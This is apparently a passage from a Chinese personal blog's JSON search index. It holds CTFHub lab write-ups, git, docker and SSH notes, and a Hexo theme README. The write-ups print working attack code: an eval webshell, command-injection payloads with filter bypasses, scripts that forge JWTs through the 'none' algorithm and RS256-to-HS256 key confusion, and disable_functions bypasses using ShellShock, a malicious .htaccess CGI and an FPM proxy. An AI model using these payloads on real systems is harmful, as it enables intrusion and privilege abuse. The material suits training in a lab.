/&gt;'; header( \"refresh:3;url=index.php\" ); //print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125; &#125;?&gt; @TOC","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"sql","slug":"sql","permalink":"/tags/sql/"},{"name":"sqli-lab","slug":"sqli-lab","permalink":"/tags/sqli-lab/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"linux动态加载","slug":"linux动态加载","date":"2022-08-29T10:18:54.829Z","updated":"2022-08-30T10:22:15.808Z","comments":true,"path":"2022/08/linux动态加载/","link":"","permalink":"/2022/08/linux动态加载/","excerpt":"","text":"linux动态加载查看环境先给了755他自己传了flag 等于告诉我们在哪了然后限到了644不想让我们直接看 都到这一题了权限应该不用讲了 提示给了shell且不需要提权于是需要新学一个东西动态加载 Linux ELF Dynaamic Loaderelf文件elf文件是linux下的可执行文件文件头为elf 不知道是靶机还是蚁剑虚拟终端的问题 没法vi直接cat就能看到了 动态库链接器/加载器 当需要动态链接的应用被操作系统加载时 系统必须要定位然后加载它所需要的所有动态库文件 在Linux环境下，这项工作是由ld-linux.so.2来负责完成的 执行操作时操作系统会将控制权交给 ld-linux.so 而不是交给程序正常的进入地址 ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。 ldd命令使用ldd命令即可查看简便的shell命令依赖哪些动态加载库 姿势在cat elf文件时看到第一行后面/lib64/ld-linux-x86-64.so.2 动态库并且在ldd可以看到ls 和 cat动用他了用！这是他的介绍执行1/lib64/ld-linux-x86-64.so.2 /readflag get","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"ctfhub","slug":"ctfhub","permalink":"/tags/ctfhub/"},{"name":"linux","slug":"linux","permalink":"/tags/linux/"},{"name":"动态加载","slug":"动态加载","permalink":"/tags/动态加载/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"ctfhub-jwt","slug":"jwt","date":"2022-08-29T10:18:54.827Z","updated":"2022-08-30T10:21:55.466Z","comments":true,"path":"2022/08/jwt/","link":"","permalink":"/2022/08/jwt/","excerpt":"","text":"基础知识题目附件：jwt基础知识 flag在下面 需要了解一下jwt组成部分 敏感信息泄露随便输个 进去查消息头 然后在 jwt.io decode 一共两部分ag是另一半 无签名12345678910import jwtalgorithm=\"none\"payload = &#123; \"username\": \"admin\", \"password\": \"admin\", \"role\":\"admin\" &#125;key = \"\"encoded = jwt.encode(payload,key,algorithm)print(encoded) jwt的签名可以为无 今天写这个脚本的时候命名为jwt.py 结果报错 但是系统环境运行正常 才知道是文件名的事 import jwt 他先自己引用自己了 抓包 把cookie里的token改为这脚本的运行结果 弱密钥需要用到jwt-cracker 依次执行即可 1234git clone https://github.com/brendan-rius/c-jwt-cracker./c-jwt-crackermake./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs 然后得出该jwt密钥 然后放之前那个网站 改role为admin 返回提交token 修改签名算法把cookie清空后提交用户名密码 得到一串jwt 丢进发现是RS256编码（不对称式编码） 需要改为对称式编码 如HS256 题目中给了public key 用PUBLIC_KEY采用HS256进行加密payload构造token 借用大神h0ld1rs的脚本 无签名那段脚本 是勉勉强强写出来的 这题就先用大神的脚本吧 我太菜了 123456789101112131415161718192021222324252627# coding=GBKimport hmacimport hashlibimport base64file = open('publickey.pem')#需要将文中的publickey下载 与脚本同目录key = file.read()# Paste your header and payload hereheader = '&#123;\"typ\": \"JWT\", \"alg\": \"HS256\"&#125;'payload = '&#123;\"username\": \"admin\", \"role\": \"admin\"&#125;'# Creating encoded headerencodeHBytes = base64.urlsafe_b64encode(header.encode(\"utf-8\"))encodeHeader = str(encodeHBytes, \"utf-8\").rstrip(\"=\")# Creating encoded payloadencodePBytes = base64.urlsafe_b64encode(payload.encode(\"utf-8\"))encodePayload = str(encodePBytes, \"utf-8\").rstrip(\"=\")# Concatenating header and payloadtoken = (encodeHeader + \".\" + encodePayload)# Creating signaturesig = base64.urlsafe_b64encode(hmac.new(bytes(key, \"UTF-8\"), token.encode(\"utf-8\"), hashlib.sha256).digest()).decode(\"UTF-8\").rstrip(\"=\")print(token + \".\" + sig) 运行后把token返回去验证 成功","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"jwt","slug":"jwt","permalink":"/tags/jwt/"},{"name":"json web token","slug":"json-web-token","permalink":"/tags/json-web-token/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"git命令","slug":"git","date":"2022-08-29T10:18:54.825Z","updated":"2022-08-30T10:21:14.356Z","comments":true,"path":"2022/08/git/","link":"","permalink":"/2022/08/git/","excerpt":"","text":"创建仓库命令initgit init 命令用于在目录中创建新的 Git 仓库。在文件夹中，会被创建出一个.git的一个隐藏文件，这时，本地库已经初始化完成. clonegit clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。拷贝项目命令格式如下： 1git clone [url] 提交与修改addgit add 命令可将该文件添加到暂存区。 添加一个或多个文件到暂存区 commitgit commit 命令将暂存区内容添加到本地仓库中。提交暂存区到本地仓库中:1git commit -m [message] [message] 可以是一些备注信息。 statusgit status 命令用于查看在你上次提交之后是否有对文件进行再次修改。 rmgit rm 命令用于删除文件。如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。 mvgit mv 命令用于移动或重命名一个文件、目录或软连接。1git mv [file] [newfile] 如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数：1git mv -f [file] [newfile] 远程操作remote显示所有远程仓库：1git remote -v pullgit pull 命令用于从远程获取代码并合并本地的版本。1git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt; pushgit push 命用于从将本地的分支版本上传到远程并合并。1git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"git","slug":"git","permalink":"/tags/git/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"kali安装docker","slug":"docker","date":"2022-08-29T10:18:54.823Z","updated":"2022-08-30T10:20:55.195Z","comments":true,"path":"2022/08/docker/","link":"","permalink":"/2022/08/docker/","excerpt":"","text":"kali安装docker12345678apt-get updateapt-get install docker-engine# 安装结束，打开docker服务service docker start# 验证安装，运行测试样例docker --versiondocker run hello-world#测试 docker 常用命令12345docker --versiondocker imagesdocker ps -adocker run -d --name 123 -p 127.0.0.1:80:80 镜像名docker stop 123 其他常用命令见菜鸟教程 dockers底层原理Namespaces 命名空间是 Linux 为我们提供的==用于分离进程树、网络接口、挂载点以及进程间通信等资源==的方法。在日常使用Linux时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。 CGroups 我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们==提供物理资源上的隔离==，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I/O 和网络带宽。==在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。==","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"kali","slug":"kali","permalink":"/tags/kali/"},{"name":"docker","slug":"docker","permalink":"/tags/docker/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"ctfhub-rce","slug":"ctfhub-rce","date":"2022-08-29T10:18:54.816Z","updated":"2022-08-30T10:18:27.165Z","comments":true,"path":"2022/08/ctfhub-rce/","link":"","permalink":"/2022/08/ctfhub-rce/","excerpt":"","text":"rce：远程代码执行漏洞分为远程命令执行ping和远程代码执行evel。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。相当于直接操控服务器电脑的cmd命令行！高危漏洞！ eval执行12345678&lt;?php if(isset($_REQUEST['cmd']))&#123; eval($_REQUEST['cmd']); &#125; else&#123; highlight_file(__FILE__); &#125;?&gt; 传参给cmd来eval 1/?cmd=system(\"ls /\");//此处因为根目录无flag 所以看上一级目录 找到后 再cat /flag_** 文件包含这里使用strpos函数 strpos:查找字符串首次出现的位置 int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) 题目使用 123if(!strpos($_GET[\"file\"],\"flag\"))&#123;//无flag字符即可运行 include $_GET[\"file\"];&#125; 来包含文件，而下方给出的shell.txt含有eval漏洞 于是包含它（shell.txt没有“flag”字符 所以这里strpos没影响） 通过get(包含文件) post(传参)并用来得到flag php info1234567891011&lt;?phpif (isset($_GET[&apos;file&apos;]))&#123; if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123; include($_GET[&quot;file&quot;]); &#125; else &#123; echo &quot;Hacker!!!&quot;; &#125;&#125;else &#123; highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&apos;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt; 点击phpinfo链接 可查看php环境 php://input12345/*php:// — 访问各个输入/输出流（I/O streams）PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 php://input是个可以访问请求的原始数据的只读流。 读取源代码看环境 无法使用php://input 123456789101112&lt;?phperror_reporting(E_ALL);if (isset($_GET['file'])) &#123; if ( substr($_GET[\"file\"], 0, 6) === \"php://\" ) &#123; include($_GET[\"file\"]); &#125; else &#123; echo \"Hacker!!!\"; &#125;&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; 但还必须是php://开头 php://filter 远程包含同phpinfo做法相同 命令注入输入命令1127.0.0.1;ls 然后cat时出现了问题 输出被限制了 于是用管道符号来限制输出base64 得到后再解码 过滤cat123456789101112131415161718192021222324252627&lt;?php$res = FALSE;if (isset($_GET[&apos;ip&apos;]) &amp;&amp; $_GET[&apos;ip&apos;]) &#123; $ip = $_GET[&apos;ip&apos;]; $m = []; if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;//过滤了cat $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;; exec($cmd, $res); &#125; else &#123; $res = $m; &#125;&#125;?&gt;&lt;pre&gt;&lt;?php if ($res) &#123; print_r($res); &#125;?&gt;&lt;/pre&gt;&lt;?php show_source(__FILE__);?&gt;&lt;/body&gt;&lt;/html&gt; moreLinux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。 1more [-dlfpcsu] [-num] [+/pattern] [+linenum] [fileNames..] 过滤空格在linux里空格可用&lt; 或 ${IFS}代替 过滤运算符cat [file]|base64还可以用base64 [file] 12345678910111213&lt;?php$res = FALSE;if (isset($_GET[&apos;ip&apos;]) &amp;&amp; $_GET[&apos;ip&apos;]) &#123; $ip = $_GET[&apos;ip&apos;]; $m = []; if (!preg_match_all(&quot;/(\\||\\&amp;)/&quot;, $ip, $m)) &#123; $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;; exec($cmd, $res); &#125; else &#123; $res = $m; &#125;&#125;?&gt; 综合练习1!preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/\", $ip ;可以用%0a(url编码) cat用base64 flag用正则f** lag等 空格用 ${IFS}","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"ctfhub","slug":"ctfhub","permalink":"/tags/ctfhub/"},{"name":"rce","slug":"rce","permalink":"/tags/rce/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"Bypass disable_function","slug":"Bypass disable_function","date":"2022-08-29T10:18:54.815Z","updated":"2022-08-30T10:20:13.291Z","comments":true,"path":"2022/08/Bypass disable_function/","link":"","permalink":"/2022/08/Bypass disable_function/","excerpt":"","text":"LD_PRELOAD时间紧 于是先采用最省时的方法先蚁剑连发现打不开flag文件要使用蚁剑插件绕过disabled function 如果蚁剑插件市场打不开的话可以去github搜github上有说明 按着他的安 连上之后在蚁剑主页面右键webshell使用该插件按照步骤操作成功后把webshell地址改为http://……/.antproxy.php在连上就能tac了tac /flag ShellShock进去发现连不上查了下大佬博客说是环境不正常原理如下 如果环境变量的值以字符() {开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在shell启动的时候才生效。 脚本123456&lt;?php$cmd = \" tac /flag&gt;/var/www/html/1.txt\";putenv(\"PHP_DMIND=() &#123; :; &#125;;$cmd\");error_log(\"dmind\",1); echo file_get_contents(\"/var/www/html/1.txt\");?&gt; 用蚁剑传进去后浏览器访问这个文件即可在1.txt看到flag Apache Mod CGI 如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令 1.Mod CGI就是把PHP做为APACHE一个内置模块，让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP.2.它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行.3.在.htaccess文件中可定制用户定义标识头4.添加Options +ExecCGI，代表着允许使用mod_cgi模块执行CGI脚本5.添加AddHandler cgi-script .cgi，代表着包含.cgi扩展名的文件都将被视为CGI程序 条件 必须是apache环境 mod_cgi已经启用 必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none 必须有权限写.htaccess文件 脚本：.htaccess12Options +ExecCGIAddHandler cgi-script .cgi shell.cgi12#!/bin/shecho&amp;&amp;cd \"/var/www/html/backdoor\";cat shell.cgi;echo 96642;pwd;echo c26b314f4b 简单方法：蚁剑连还是那个插件bypass！ PHP-FPM FPM是fast-cgi的协议解析器 webserver使用cgi协议封装好用户的请求发送给FPM FPM按照cgi的协议将TCP流解析成真正的数据 蚁剑bypass模式：FPM地址：127.0.0.1：9000或localhost：9000植入后修改shell地址为http://……/.antproxy.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phpfunction get_client_header()&#123; $headers=array(); foreach($_SERVER as $k=&gt;$v)&#123; if(strpos($k,'HTTP_')===0)&#123; $k=strtolower(preg_replace('/^HTTP/', '', $k)); $k=preg_replace_callback('/_\\w/','header_callback',$k); $k=preg_replace('/^_/','',$k); $k=str_replace('_','-',$k); if($k=='Host') continue; $headers[]=\"$k:$v\"; &#125; &#125; return $headers;&#125;function header_callback($str)&#123; return strtoupper($str[0]);&#125;function parseHeader($sResponse)&#123; list($headerstr,$sResponse)=explode(\"\",$sResponse, 2); $ret=array($headerstr,$sResponse); if(preg_match('/^HTTP/1.1 d&#123;3&#125;/', $sResponse))&#123; $ret=parseHeader($sResponse); &#125; return $ret;&#125;set_time_limit(120);$headers=get_client_header();$host = \"127.0.0.1\";$port = 61921;$errno = '';$errstr = '';$timeout = 30;$url = \"/index.php\";if (!empty($_SERVER['QUERY_STRING']))&#123; $url .= \"?\".$_SERVER['QUERY_STRING'];&#125;;$fp = fsockopen($host, $port, $errno, $errstr, $timeout);if(!$fp)&#123; return false;&#125;$method = \"GET\";$post_data = \"\";if($_SERVER['REQUEST_METHOD']=='POST') &#123; $method = \"POST\"; $post_data = file_get_contents('php://input');&#125;$out = $method.\" \".$url.\" HTTP/1.1\\r\\n\";$out .= \"Host: \".$host.\":\".$port.\"\\r\\n\";if (!empty($_SERVER['CONTENT_TYPE'])) &#123; $out .= \"Content-Type: \".$_SERVER['CONTENT_TYPE'].\"\\r\\n\";&#125;$out .= \"Content-length:\".strlen($post_data).\"\\r\\n\";$out .= implode(\"\\r\\n\",$headers);$out .= \"\\r\\n\\r\\n\";$out .= \"\".$post_data;fputs($fp, $out);$response = '';while($row=fread($fp, 4096))&#123; $response .= $row;&#125;fclose($fp);$pos = strpos($response, \"\\r\\n\\r\\n\");$response = substr($response, $pos+4);echo $response; UAFGC 利用的是PHP Garbage Collector程序中的堆溢出触发 题目附件其实蚁剑的reference就有这附件 包括后面的大佬脚本可以用蚁剑一把梭 另附==大佬poc==UAF的脚本里面都有==tql！== Json Serializer UAF 漏洞利用json在序列化中的堆溢出触发bypass，漏洞为bug #77843 蚁剑一把梭 Backtrace UAF 漏洞利用的是 debug_backtrace这个函数，可以利用该函数的漏洞返回已经销毁的变量的引用达成堆溢出，漏洞为bug #76047 FFIPHP FFI详解 ==disabled function:==pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv iconv github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9/ https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phpfunction get_client_header()&#123; $headers=array(); foreach($_SERVER as $k=&gt;$v)&#123; if(strpos($k,'HTTP_')===0)&#123; $k=strtolower(preg_replace('/^HTTP/', '', $k)); $k=preg_replace_callback('/_\\w/','header_callback',$k); $k=preg_replace('/^_/','',$k); $k=str_replace('_','-',$k); if($k=='Host') continue; $headers[]=\"$k:$v\"; &#125; &#125; return $headers;&#125;function header_callback($str)&#123; return strtoupper($str[0]);&#125;function parseHeader($sResponse)&#123; list($headerstr,$sResponse)=explode(\"\",$sResponse, 2); $ret=array($headerstr,$sResponse); if(preg_match('/^HTTP/1.1 d&#123;3&#125;/', $sResponse))&#123; $ret=parseHeader($sResponse); &#125; return $ret;&#125;set_time_limit(120);$headers=get_client_header();$host = \"127.0.0.1\";$port = 63947;$errno = '';$errstr = '';$timeout = 30;$url = \"/index.php\";if (!empty($_SERVER['QUERY_STRING']))&#123; $url .= \"?\".$_SERVER['QUERY_STRING'];&#125;;$fp = fsockopen($host, $port, $errno, $errstr, $timeout);if(!$fp)&#123; return false;&#125;$method = \"GET\";$post_data = \"\";if($_SERVER['REQUEST_METHOD']=='POST') &#123; $method = \"POST\"; $post_data = file_get_contents('php://input');&#125;$out = $method.\" \".$url.\" HTTP/1.1\\r\\n\";$out .= \"Host: \".$host.\":\".$port.\"\\r\\n\";if (!empty($_SERVER['CONTENT_TYPE'])) &#123; $out .= \"Content-Type: \".$_SERVER['CONTENT_TYPE'].\"\\r\\n\";&#125;$out .= \"Content-length:\".strlen($post_data).\"\\r\\n\";$out .= implode(\"\\r\\n\",$headers);$out .= \"\\r\\n\\r\\n\";$out .= \"\".$post_data;fputs($fp, $out);$response = '';while($row=fread($fp, 4096))&#123; $response .= $row;&#125;fclose($fp);$pos = strpos($response, \"\\r\\n\\r\\n\");$response = substr($response, $pos+4);echo $response;","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"提权","slug":"提权","permalink":"/tags/提权/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"终端便捷ssh（免密）连接","slug":"免密ssh登录","date":"2022-08-29T10:18:54.812Z","updated":"2022-08-30T09:55:03.292Z","comments":true,"path":"2022/08/免密ssh登录/","link":"","permalink":"/2022/08/免密ssh登录/","excerpt":"","text":"普通ssh方法物理机ssh连接虚拟机 没基础的可以这样连：复杂 终端快捷ssh复制&#39;s前面的打开终端设置 左侧添加新配置文件-&gt;添加新控制文件 然后填写第二行即命令行 1ssh 虚拟机登录用户名@虚拟机IP 其实就是 ssh上面复制的 保存 即可在物理机终端快速打开 免密ssh登录在物理机运行： 1ssh-keygen 后面第一个路径回车 后面密码直接回车（即可实现免密码登录） 12345678910111213Your identification has been saved in C:\\Users\\ /.ssh/id_rsa.Your public key has been saved in C:\\Users\\ /.ssh/id_rsa.pub.The key fingerprint is:SHA256:ln6ZkrhHWH*********tRbGBeooF4g \\ @The key's randomart image is:+---[RSA 3072]----+| .o.*.+ ||.. o..+ * . ||***********. || *.o.o+.o ||. = +.o*S . || ********* |+----[SHA256]-----+ 找到第一行的那个目录，把id_rsa.pub文件复制到虚拟机 执行 12cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keyschmod 770 ~/.ssh/authorized_keys 报未找到.ssh的话 要先运行ssh-keygen和在物理机设置一样 然后终端打开虚拟机就不用输密码了 报错情况仍需密码：传到虚拟机的keygen一定要是公钥pub 连接超时过一段时间之后 连不上是ip未固定需将虚拟机ip固定桥接和net模式固定IP方式会抽空发到时候在这打个传送 12cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keyschmod 700 ~/.ssh/authorized_keys 报未找到.ssh的话 要先运行ssh-keygen和在物理机设置一样 然后终端打开虚拟机就不用输密码了","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"ssh","slug":"ssh","permalink":"/tags/ssh/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"ctfhub-彩蛋","slug":"CTFHub彩蛋","date":"2022-08-28T10:40:28.395Z","updated":"2022-08-30T10:20:36.813Z","comments":true,"path":"2022/08/CTFHub彩蛋/","link":"","permalink":"/2022/08/CTFHub彩蛋/","excerpt":"","text":"工具 彩蛋一开始的想法是工具一共有8页，想抓个包改下看看有没有第九页抓包后发现不管哪一页limit都是12 但offset在变化于是这样设置参数在长度为1000到6、7千左右随便一个双击后 ==点击响应== 看==响应==包在最后一行 首页 彩蛋api中间框内隐藏着两行字ctfhub{c18732f48a96c40d40a06e74b1305706} 题目入口 彩蛋在web-ssrf中间那一列的某些题传参错误时会出现详情见ctfhub-ssrfpost最后一行介绍 公众号公众号彩蛋坑的一批！首先要先绑定然后点彩蛋它提示要回复正确的关键词我*#@%我回复过 彩蛋 关键词 egg ctfhub CTFHub 拿来把你 CTFer 自己人 …… 到底没想到竟然是flag 投稿提交 彩蛋只找到了前半部分分别在题目提交和wp提交页面的最后1234ctfhub&#123;029e02eb3a1 e8c49b1132b5 15b652a5f3a8 62013&#125; 最后这个彩蛋剩余部分也没找到网上搜了下才明白：感谢anweilx的wp第一行是俩页面的最后有第二行是在俩页面源码 分别搜==奖励== 在上面那行一个是base64然后再转url 一个是hex解码第三行是俩页面的图片隐写 丢进winhex第四行有提示aes 256 ecb解码 其他彩蛋剩余皆可在对应页面搜索egg即可获得","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"ctfhub","slug":"ctfhub","permalink":"/tags/ctfhub/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"Hexo-Theme-Sakura","slug":"Hexo-Theme-Sakura","date":"2018-12-12T14:16:01.000Z","updated":"2022-08-29T05:28:06.229Z","comments":true,"path":"2018/12/Hexo-Theme-Sakura/","link":"","permalink":"/2018/12/Hexo-Theme-Sakura/","excerpt":"","text":"hexo-theme-sakura主题 English document 基于WordPress主题Sakura修改成Hexo的主题。 demo预览 正在开发中…… 交流群若你是使用者，加群QQ: 801511924 若你是创作者，加群QQ: 194472590 主题特性 首页大屏视频 首页随机封面 图片懒加载 valine评论 fancy-box相册 pjax支持，音乐不间断 aplayer音乐播放器 多级导航菜单（按现在大部分hexo主题来说，这也算是个特性了） 赞赏作者如果喜欢hexo-theme-sakura主题，可以考虑资助一下哦~非常感激！ paypal | Alipay 支付宝 | WeChat Pay 微信支付 未完善的使用教程那啥？老实说我目前也不是很有条理233333333~ 1、主题下载安装hexo-theme-sakura建议下载压缩包格式，因为除了主题内容还有些source的配置对新手来说比较太麻烦，直接下载解压就省去这些麻烦咯。 下载好后解压到博客根目录（不是主题目录哦，重复的选择替换）。接着在命令行（cmd、bash）运行npm i安装依赖。 2、主题配置博客根目录下的_config配置站点12345678# Sitetitle: 你的站点名subtitle:description: 站点简介keywords:author: 作者名language: zh-cntimezone: 部署123456deploy: type: git repo: github: 你的github仓库地址 # coding: 你的coding仓库地址 branch: master 备份 （使用hexo b发布备份到远程仓库）1234567backup: type: git message: backup my blog of https://honjun.github.io/ repository: # 你的github仓库地址,备份分支名 （建议新建backup分支） github: https://github.com/honjun/honjun.github.io.git,backup # coding: https://git.coding.net/hojun/hojun.git,backup 主题目录下的_config配置其中标明【改】的是需要修改部门，标明【选】是可改可不改，标明【非】是不用改的部分123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121# site name# 站点名 【改】prefixName: さくら荘そのsiteName: hojun# favicon and site master avatar# 站点的favicon和头像 输入图片路径（下面的配置是都是cdn的相对路径，没有cdn请填写完整路径，建议使用jsdeliver搭建一个cdn啦，先去下载我的cdn替换下图片就行了，简单方便~）【改】favicon: /images/favicon.icoavatar: /img/custom/avatar.jpg# 站点url 【改】url: https://sakura.hojun.cn# 站点介绍（或者说是个人签名）【改】description: Live your life with passion! With some drive!# 站点cdn，没有就为空 【改】 若是cdn为空，一些图片地址就要填完整地址了，比如之前avatar就要填/img/custom/avatar.jpgcdn: # 开启pjax 【选】pjax: 1# 站点首页的公告信息 【改】notice: hexo-Sakura主题已经开源，目前正在开发中...# 懒加载的加载中图片 【选】lazyloadImg: /img/loader/orange.progress-bar-stripe-loader.svg# 站点菜单配置 【选】menus: 首页: &#123; path: /, fa: fa-fort-awesome faa-shake &#125; 归档: &#123; path: /archives, fa: fa-archive faa-shake, submenus: &#123; 技术: &#123;path: /categories/技术/, fa: fa-code &#125;, 生活: &#123;path: /categories/生活/, fa: fa-file-text-o &#125;, 资源: &#123;path: /categories/资源/, fa: fa-cloud-download &#125;, 随想: &#123;path: /categories/随想/, fa: fa-commenting-o &#125;, 转载: &#123;path: /categories/转载/, fa: fa-book &#125; &#125; &#125; 清单: &#123; path: javascript:;, fa: fa-list-ul faa-vertical, submenus: &#123; 书单: &#123;path: /tags/悦读/, fa: fa-th-list faa-bounce &#125;, 番组: &#123;path: /bangumi/, fa: fa-film faa-vertical &#125;, 歌单: &#123;path: /music/, fa: fa-headphones &#125;, 图集: &#123;path: /tags/图集/, fa: fa-photo &#125; &#125; &#125; 留言板: &#123; path: /comment/, fa: fa-pencil-square-o faa-tada &#125; 友人帐: &#123; path: /links/, fa: fa-link faa-shake &#125; 赞赏: &#123; path: /donate/, fa: fa-heart faa-pulse &#125; 关于: &#123; path: /, fa: fa-leaf faa-wrench , submenus: &#123; 我？: &#123;path: /about/, fa: fa-meetup&#125;, 主题: &#123;path: /theme-sakura/, fa: iconfont icon-sakura &#125;, Lab: &#123;path: /lab/, fa: fa-cogs &#125;, &#125; &#125; 客户端: &#123; path: /client/, fa: fa-android faa-vertical &#125; RSS: &#123; path: /atom.xml, fa: fa-rss faa-pulse &#125;# Home page sort type: -1: newer first，1: older first. 【非】homePageSortType: -1# Home page article shown number) 【非】homeArticleShown: 10# 背景图片 【选】bgn: 8# startdash面板 url, title, desc img 【改】startdash: - &#123;url: /theme-sakura/, title: Sakura, desc: 本站 hexo 主题, img: /img/startdash/sakura.md.png&#125; - &#123;url: http://space.bilibili.com/271849279, title: Bilibili, desc: 博主的b站视频, img: /img/startdash/bilibili.jpg&#125; - &#123;url: /, title: hojun的万事屋, desc: 技术服务, img: /img/startdash/wangshiwu.jpg&#125;# your site build time or founded date# 你的站点建立日期 【改】siteBuildingTime: 07/17/2018# 社交按钮(social) url, img PC端配置 【改】social: github: &#123;url: http://github.com/honjun, img: /img/social/github.png&#125; sina: &#123;url: http://weibo.com/mashirozx?is_all=1, img: /img/social/sina.png&#125; wangyiyun: &#123;url: http://weibo.com/mashirozx?is_all=1, img: /img/social/wangyiyun.png&#125; zhihu: &#123;url: http://weibo.com/mashirozx?is_all=1, img: /img/social/zhihu.png&#125; email: &#123;url: http://weibo.com/mashirozx?is_all=1, img: 